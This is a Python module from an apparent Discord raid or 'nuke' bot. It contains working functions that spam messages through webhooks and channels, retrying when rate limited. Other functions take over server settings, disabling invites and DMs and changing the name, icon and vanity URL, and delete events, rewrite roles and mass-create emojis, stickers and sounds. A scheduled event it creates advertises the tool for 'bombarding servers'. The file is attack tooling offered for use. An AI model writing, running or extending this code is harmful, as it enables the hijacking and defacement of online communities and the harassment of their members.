import asyncio
import discord
import utils
import aiohttp
from datetime import datetime, UTC, timedelta
from typing import List, overload, Literal, Tuple, Optional, Union, Any
from aiohttp import ClientSession, ClientError
from user import Settings
from default import server_invite, server_banner, p_name
from about import __version__

MISSING = discord.utils.MISSING
xs32 = utils.Xorshift32()
gif = utils.gif()

async def create_channel(guild: discord.Guild, settings: Settings, **options) -> discord.TextChannel:
    channel = settings.channel
    return await guild.create_text_channel(
        name=channel.name,
        topic=channel.topic,
        nsfw=channel.nsfw,
        news=channel.news if 'COMMUNITY' in guild.features else False,
        slowmode_delay=channel.slowmode_delay,
        overwrites={
            guild.default_role: discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True
            )
        },
        **options
    )

async def mess_channel(channel: discord.abc.GuildChannel, guild: discord.Guild, settings: Settings, **options):
    _channel = settings.channel
    options = {
        'name': _channel.name,
        'overwrites': {
            guild.default_role: discord.PermissionOverwrite(
                view_channel=True,
                read_message_history=True
            )
        },
        **options
    }

    if not isinstance(channel, discord.CategoryChannel):
        options['slowmode_delay'] = _channel.slowmode_delay

    if isinstance(channel, discord.TextChannel):
        options.update({
            'topic': _channel.topic,
            'nsfw': _channel.nsfw,
            'news': _channel.news if 'COMMUNITY' in guild.features else False
        })
    await channel.edit(**options) # pyright: ignore[reportAttributeAccessIssue]

async def create_webhook(channel: discord.TextChannel, settings: Settings, *, avatar: Optional[bytes] = None) -> discord.Webhook:
    webhook = settings.webhook
    return await channel.create_webhook(
        name=webhook.username,
        avatar=avatar,
        reason=settings.reason
    )

@overload
async def get_webhook(
    channel: discord.abc.GuildChannel,
    *,
    amount: Literal[1] = ...,
    return_channel: Literal[False] = ...
) -> Optional[discord.Webhook]:
    ...

@overload
async def get_webhook(
    channel: discord.abc.GuildChannel,
    *,
    amount: Literal[1] = ...,
    return_channel: Literal[True] = ...
) -> Tuple[Optional[discord.Webhook], Union[discord.TextChannel, discord.VoiceChannel]]:
    ...

@overload
async def get_webhook(
    channel: discord.abc.GuildChannel,
    *,
    amount: Optional[int] = ...,
    return_channel: Literal[False] = ...
) -> List[discord.Webhook]:
    ...

@overload
async def get_webhook(
    channel: discord.abc.GuildChannel,
    *,
    amount: Optional[int] = ...,
    return_channel: Literal[True] = ...
) -> List[Tuple[discord.Webhook, Union[discord.TextChannel, discord.VoiceChannel]]]:
    ...

async def get_webhook(channel: discord.abc.GuildChannel, *, amount: Optional[int] = 1, return_channel: bool = False) -> Any:
    if isinstance(channel, (discord.TextChannel, discord.VoiceChannel)):
        webhooks = await channel.webhooks()
        if amount:
            web = webhooks[:amount]
        else:
            web = webhooks
        if len(web) == 1:
            web = web[0]
        elif not len(web):
            web = None
        if return_channel:
            return web, channel
        return web
    
async def get_webhooks(guild: discord.Guild, *, amount: Optional[int] = 1) -> List[Tuple[discord.Webhook, discord.abc.GuildChannel]]:
    items: List[Tuple[discord.Webhook, discord.abc.GuildChannel]] = []
    semaphore = asyncio.Semaphore(10)
    def check(channel: discord.abc.GuildChannel):
        return channel.position

    async def get(channel: discord.abc.GuildChannel):
        nonlocal items
        async with semaphore:
            item = await get_webhook(channel, amount=1, return_channel=True)
            if item[0]:
                items.append(item) # pyright: ignore[reportArgumentType]
            if amount and len(items) >= amount:
                raise RuntimeError
            if channel == sorted(guild.channels, key=check)[-1]:
                raise RuntimeError
    
    try:
        await asyncio.gather(*[
            get(channel) for channel in sorted(guild.channels, key=check
        )], return_exceptions=True)
    except RuntimeError:
        pass
    return items if not amount else items[:amount]

async def spam_webhook(webhook: discord.Webhook, settings: Settings, *, amount: Optional[int] = None) -> None:
    wb = settings.webhook
    message = settings.message
    for _ in range(amount or message.amount):
        try:
            await webhook.send(
                content=message.content,
                avatar_url=wb.avatar_url,
                username=wb.username,
                tts=message.tts,
                embed=message.embed or MISSING
            )
        except discord.HTTPException:
            # Most likely rate limited. Short sleep
            await asyncio.sleep(0.1)
            return await spam_webhook(webhook, settings, amount=amount)

async def spam_channel(channel: Union[discord.TextChannel, discord.VoiceChannel], settings: Settings, semaphore: asyncio.Semaphore, *, amount: int = 6) -> None:
    message = settings.message
    sent = 0
    for i in range(amount):
        while True:
            try:
                async with semaphore:
                    await channel.send(
                        content=message.content,
                        tts=message.tts,
                        embed=message.embed or MISSING
                    )
                    if i == sent:
                        sent += 1
                        break
            except (discord.HTTPException, aiohttp.ClientOSError):
                # Rate limit or OSError such as Connection reset by peer
                continue

async def mess_server(guild: discord.Guild, settings: Settings, session: ClientSession, *, community: Optional[bool] = None) -> List[discord.TextChannel]:
    server = settings.guild
    community = server.community if community is None else community
    if server.icon:
        try:
            response = await session.get(server.icon)
            icon = await response.read()
        except ClientError:
            icon = MISSING
    else:
        icon = MISSING

    if guild.premium_tier >= 1:
        if server.banner:
            try:
                response = await session.get(server.banner)
                splash = await response.read()
            except ClientError:
                splash = MISSING
        else:
            splash = MISSING
    else:
        splash = MISSING

    if guild.premium_tier >= 2:
        if server.banner:
            try:
                response = await session.get(server.banner)
                banner = await response.read()
            except ClientError:
                banner = MISSING
        else:
            banner = MISSING
    else:
        banner = MISSING

    if guild.premium_tier == 3:
        vanity = server.vanity
    else:
        vanity = MISSING

    response = await session.get(server_banner)
    server_banner_bytes = await response.read()

    if community:
        channels = await asyncio.gather(*[create_channel(guild, settings, nsfw=False) for _ in range(2)])
        community_params = {
            'community': True,
            'public_updates_channel': channels[0],
            'rules_channel': channels[1],
        }
    else:
        community_params = {
            'community': False
        }
        channels = []

    if server.invites_disabled_until:
        invites_disabled_until = server.invites_disabled_until
        dt = datetime.now().timestamp()
        invites_disabled_until = datetime.fromtimestamp(invites_disabled_until + dt, UTC)
    else:
        invites_disabled_until = MISSING

    if server.dms_disbabled_until:
        dms_disbabled_until = server.dms_disbabled_until
        dt = datetime.now().timestamp()
        dms_disbabled_until = datetime.fromtimestamp(dms_disbabled_until + dt, UTC)
    
    else:
        dms_disbabled_until = MISSING

    if community:
        content_filter = discord.ContentFilter.all_members
        verification_level = discord.VerificationLevel.high
    else:
        content_filter = server.content_filter
        verification_level = server.verification_level

    for event in guild.scheduled_events:
        asyncio.create_task(event.delete(reason=settings.reason))

    if settings.default_event:
        async def scheduled_event_task():
            while 1:
                try:
                    await guild.create_scheduled_event(
                        name=f'Join {p_name} V{__version__}',
                        start_time=datetime.now(UTC) + timedelta(seconds=3),
                        end_time=discord.utils.utcnow().replace(year=2029),
                        entity_type=discord.EntityType.external,
                        privacy_level=discord.PrivacyLevel.guild_only,
                        location=server_invite,
                        image=server_banner_bytes,
                        description=f'Join {p_name} V{__version__} and start bombarding servers today! {server_invite}',
                        reason=settings.reason
                    )
                    break
                except discord.HTTPException:
                    continue
        asyncio.create_task(scheduled_event_task())
    asyncio.create_task(guild.edit(
        name=server.name or MISSING,
        description=server.description or MISSING,
        icon=icon,
        splash=splash,
        banner=banner,
        vanity_code=vanity or MISSING,
        default_notifications=server.notification_level or MISSING,
        system_channel_flags=server.system_channel_flags or MISSING,
        discoverable=False,
        widget_enabled=server.server_widget or MISSING,
        dms_disabled_until=dms_disbabled_until,
        invites_disabled_until=invites_disabled_until,
        premium_progress_bar_enabled=server.premium_progress_bar_enabled or MISSING,
        verification_level=verification_level or MISSING,
        explicit_content_filter=content_filter or MISSING,
        **community_params # pyright: ignore[reportArgumentType]
    ))
    return channels

async def create_role(guild: discord.Guild, settings: Settings, session: ClientSession, **options) -> discord.Role:
    role = settings.role
    icon = None
    if guild.premium_tier >= 2:
        response = await session.get(role.icon)
        icon = response._body

    kwargs = {
        'name': role.name,
        'permissions': role.permissions,
        'color': role.color,
        'hoist': role.hoist,
        'mentionable': role.mentionable,
        'display_icon': icon or MISSING
    }
    kwargs.update(options)
    return await guild.create_role(**kwargs)

async def edit_role(role: discord.Role, guild: discord.Guild, settings: Settings, session: ClientSession, **options) -> Optional[discord.Role]:
    _role = settings.role
    icon = None
    if guild.premium_tier >= 2:
        response = await session.get(_role.icon)
        icon = response._body
    
    return await role.edit(
        name=_role.name,
        permissions=_role.permissions,
        color=_role.color,
        hoist=_role.hoist,
        mentionable=_role.mentionable,
        display_icon=icon or MISSING,
        **options
    )

async def create_emoji(guild: discord.Guild, settings: Settings, session: ClientSession, *, icon: Optional[bytes] = None) -> Optional[discord.Emoji]:
    emoji = settings.emoji
    if not icon:
        try:
            respone = await session.get(emoji.url)
            icon = await respone.read()
        except ClientError:
            return
    icon = utils.compress(icon).read()
    return await guild.create_custom_emoji(name=emoji.name, image=icon)

async def create_sticker(guild: discord.Guild, settings: Settings, session: ClientSession, *, icon: Optional[bytes] = None) -> Optional[discord.Sticker]:
    sticker = settings.sticker
    if not icon:
        try:
            respone = await session.get(sticker.url)
            icon = await respone.read()
        except ClientError:
            return
    buffer = utils.compress(icon)
    file = discord.File(buffer)
    return await guild.create_sticker(
        name=sticker.name,
        description=sticker.description,
        emoji=sticker.emoji,
        file=file
    )

async def create_soundboard_sound(guild: discord.Guild, settings: Settings, session: ClientSession, *, sound: Optional[bytes] = None) -> Optional[discord.SoundboardSound]:
    _sound = settings.soundboard
    if not sound:
        try:
            respone = await session.get(_sound.url)
            sound = await respone.read()
        except ClientError:
            return
    buffer = utils.trim_mp3(sound)
    return await guild.create_soundboard_sound(
        name=_sound.name,
        sound=buffer,
        emoji=_sound.emoji
    )